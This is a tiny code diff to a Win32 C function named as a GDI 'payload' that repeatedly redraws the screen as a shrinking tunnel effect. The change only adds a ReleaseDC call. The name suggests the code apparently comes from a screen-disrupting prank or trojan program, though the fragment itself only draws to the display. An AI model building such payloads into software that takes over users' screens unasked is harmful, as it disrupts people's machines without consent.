@@ -403,6 +403,7 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 		StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
 		StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
 	}
+        ReleaseDC(NULL, hdc);
 	PlaySoundW(NULL, NULL, NULL);
 	ExitThread(0);
 }
